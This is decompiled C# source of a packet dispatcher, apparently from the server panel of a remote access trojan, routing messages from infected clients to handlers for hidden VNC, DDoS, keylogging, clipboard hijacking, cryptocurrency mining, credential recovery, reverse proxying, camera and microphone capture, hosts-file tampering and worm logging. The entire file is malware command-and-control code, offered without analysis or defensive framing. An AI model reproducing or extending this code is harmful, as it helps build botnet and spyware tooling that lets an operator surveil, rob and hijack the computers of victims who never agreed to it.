using System;
using System.Drawing;
using Leb128;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages
{
	// Token: 0x0200006A RID: 106
	internal class Packet
	{
		// Token: 0x0600020C RID: 524 RVA: 0x000213C4 File Offset: 0x0001F5C4
		public void Read(Clients client, byte[] data)
		{
			try
			{
				object[] array = LEB128.Read(data);
				string text = (string)array[0];
				if (text != null)
				{
					switch (text.Length)
					{
					case 3:
					{
						char c = text[0];
						if (c != 'F')
						{
							if (c == 'M')
							{
								if (text == "Map")
								{
									HandlerMap.Read(client, array);
								}
							}
						}
						else if (text == "Fun")
						{
							HandlerFun.Read(client, array);
						}
						break;
					}
					case 4:
					{
						char c = text[1];
						if (c <= 'V')
						{
							if (c != 'D')
							{
								if (c == 'V')
								{
									if (text == "HVNC")
									{
										HandlerHVNC.Read(client, array);
									}
								}
							}
							else if (text == "DDos")
							{
								HandlerDDos.Read(client, array);
							}
						}
						else if (c != 'h')
						{
							if (c != 'i')
							{
								if (c == 'o')
								{
									if (text == "Pong")
									{
										HandlerPong.Read(client, array);
									}
								}
							}
							else if (text == "Ping")
							{
								HandlerPing.Read(client, array);
							}
						}
						else if (text == "Chat")
						{
							HandlerChat.Read(client, array);
						}
						break;
					}
					case 5:
					{
						char c = text[0];
						if (c != 'E')
						{
							if (c == 'S')
							{
								if (text == "Shell")
								{
									HandlerShell.Read(client, array);
								}
							}
						}
						else if (text == "Error")
						{
							HandlerError.Read(client, array);
						}
						break;
					}
					case 6:
					{
						char c = text[0];
						if (c != 'C')
						{
							if (c != 'G')
							{
								switch (c)
								{
								case 'R':
									if (text == "Report")
									{
										Methods.AppendLogs(client.IP, "Window Report " + client.Hwid + ": " + (string)array[1], Color.Purple);
									}
									break;
								case 'U':
									if (text == "Update")
									{
										Methods.AppendLogs(client.IP, "Succues Update: " + (string)array[1], Color.Green);
									}
									break;
								case 'V':
									if (text == "Volume")
									{
										HandlerVolume.Read(client, array);
									}
									break;
								case 'W':
									if (text == "Window")
									{
										HandlerWindow.Read(client, array);
									}
									break;
								}
							}
							else if (text == "GetDLL")
							{
								HandlerGetDLL.Read(client, array);
							}
						}
						else if (text == "Camera")
						{
							HandlerCamera.Read(client, array);
						}
						break;
					}
					case 7:
					{
						char c = text[3];
						if (c != 'c')
						{
							if (c != 'e')
							{
								switch (c)
								{
								case 'k':
									if (text == "Desktop")
									{
										HandlerDesktop.Read(client, array);
									}
									break;
								case 'm':
									if (text == "WormLog")
									{
										Methods.AppendLogs(client.IP, (string)array[1], Color.DarkBlue);
									}
									break;
								case 'n':
									if (text == "Connect")
									{
										HandlerConnect.Read(client, array);
									}
									break;
								case 'o':
									if (text == "AutoRun")
									{
										HandlerAutoRun.Read(client, array);
									}
									break;
								case 'p':
									if (text == "Clipper")
									{
										HandlerClipper.Read(client, array);
									}
									break;
								case 's':
									if (text == "Netstat")
									{
										HandlerNetstat.Read(client, array);
									}
									break;
								case 'v':
									if (text == "Service")
									{
										HandlerService.Read(client, array);
									}
									break;
								}
							}
							else if (!(text == "Regedit"))
							{
								if (text == "Notepad")
								{
									HandlerNotepad.Read(client, array);
								}
							}
							else
							{
								HandlerRegedit.Read(client, array);
							}
						}
						else if (text == "Process")
						{
							HandlerProcess.Read(client, array);
						}
						break;
					}
					case 8:
					{
						char c = text[5];
						if (c <= 'a')
						{
							if (c != 'E')
							{
								if (c != 'X')
								{
									if (c == 'a')
									{
										if (text == "Programs")
										{
											HandlerPrograms.Read(client, array);
										}
									}
								}
								else if (text == "MinerXmr")
								{
									HandlerMinerXmr.Read(client, array);
								}
							}
							else if (text == "MinerEtc")
							{
								HandlerMinerEtc.Read(client, array);
							}
						}
						else if (c != 'e')
						{
							if (c != 'o')
							{
								if (c == 'r')
								{
									if (text == "Explorer")
									{
										HandlerExplorer.Read(client, array);
									}
								}
							}
							else if (!(text == "WormLog1"))
							{
								if (text == "WormLog2")
								{
									Methods.AppendLogs(client.IP, (string)array[1], Color.DarkSeaGreen);
								}
							}
							else
							{
								Methods.AppendLogs(client.IP, (string)array[1], Color.DarkOrange);
							}
						}
						else if (text == "Recovery")
						{
							HandlerRecovery.Read(client, array);
						}
						break;
					}
					case 9:
					{
						char c = text[0];
						if (c <= 'H')
						{
							if (c != 'C')
							{
								if (c == 'H')
								{
									if (text == "HostsFile")
									{
										HandlerHostsFile.Read(client, array);
									}
								}
							}
							else if (text == "Clipboard")
							{
								HandlerClipboard.Read(client, array);
							}
						}
						else if (c != 'K')
						{
							if (c != 'R')
							{
								if (c == 'U')
								{
									if (text == "Uninstall")
									{
										Methods.AppendLogs(client.IP, "Succues Uninstall: " + (string)array[1], Color.Green);
									}
								}
							}
							else if (text == "Recovery1")
							{
								HandlerRecovery1.Read(client, array);
							}
						}
						else if (text == "KeyLogger")
						{
							HandlerKeyLogger.Read(client, array);
						}
						break;
					}
					case 10:
					{
						char c = text[0];
						if (c != 'B')
						{
							if (c == 'M')
							{
								if (text == "Microphone")
								{
									HandlerMicrophone.Read(client, array);
								}
							}
						}
						else if (text == "BotSpeaker")
						{
							HandlerBotSpeaker.Read(client, array);
						}
						break;
					}
					case 11:
					{
						char c = text[2];
						if (c != 'n')
						{
							if (c != 'r')
							{
								if (c == 's')
								{
									if (text == "SystemSound")
									{
										HandlerSystemSound.Read(client, array);
									}
								}
							}
							else if (text == "Performance")
							{
								HandlerPerformance.Read(client, array);
							}
						}
						else if (text == "SendDiskGet")
						{
							HandlerSendDiskGet.Read(client, array);
						}
						break;
					}
					case 12:
					{
						char c = text[2];
						switch (c)
						{
						case 'l':
							if (text == "FileSearcher")
							{
								HandlerFileSearcher.Read(client, array);
							}
							break;
						case 'm':
						case 'o':
							break;
						case 'n':
							if (text == "SendFileDisk")
							{
								Methods.AppendLogs(client.IP, "Succues File: " + (string)array[1], Color.Green);
							}
							break;
						case 'p':
							if (text == "ReportWindow")
							{
								HandlerReportWindow.Read(client, array);
							}
							break;
						default:
							if (c == 'v')
							{
								if (text == "ReverseProxy")
								{
									HandlerReverseProxy.Read(client, array);
								}
							}
							break;
						}
						break;
					}
					case 13:
					{
						char c = text[12];
						if (c <= 'U')
						{
							if (c != 'R')
							{
								if (c == 'U')
								{
									if (text == "ReverseProxyU")
									{
										HandlerReverseProxyU.Read(client, array);
									}
								}
							}
							else if (text == "ReverseProxyR")
							{
								HandlerReverseProxyR.Read(client, array);
							}
						}
						else if (c != 'r')
						{
							if (c == 't')
							{
								if (text == "SendMemoryGet")
								{
									HandlerSendMemoryGet.Read(client, array);
								}
							}
						}
						else if (text == "DeviceManager")
						{
							HandlerDeviceManager.Read(client, array);
						}
						break;
					}
					case 14:
					{
						char c = text[0];
						if (c != 'K')
						{
							if (c == 'S')
							{
								if (text == "SendFileMemory")
								{
									Methods.AppendLogs(client.IP, "Succues Inject: " + (string)array[1], Color.Green);
								}
							}
						}
						else if (text == "KeyLoggerPanel")
						{
							HandlerKeyLoggerPanel.Read(client, array);
						}
						break;
					}
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
	}
}
